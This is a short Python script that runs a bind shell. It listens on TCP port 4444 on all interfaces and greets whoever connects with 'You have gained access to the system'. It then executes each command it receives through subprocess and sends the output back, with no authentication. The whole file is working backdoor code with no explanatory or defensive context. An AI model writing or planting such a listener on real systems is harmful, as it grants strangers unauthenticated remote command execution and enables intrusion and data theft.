#!/usr/bin/python3

import socket; import subprocess; import os;

HOST = '0.0.0.0'
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))

s.listen(1)

conn, addr = s.accept()
conn.send((f"--- You have gained access to the system ---\n").encode())

while True:
    user = subprocess.getoutput("whoami")
    whodir = subprocess.getoutput("pwd")
    conn.send((f"{user}:{whodir}# ").encode())
    cmd = conn.recv(1024).decode('utf-8')
    if cmd.startswith('cd'):
        directory = cmd.split()[1]
        try:
            os.chdir(directory)
        except:
            pass
    else:
        output = subprocess.getoutput(cmd)
        conn.send((output + '\n').encode())
conn.close()
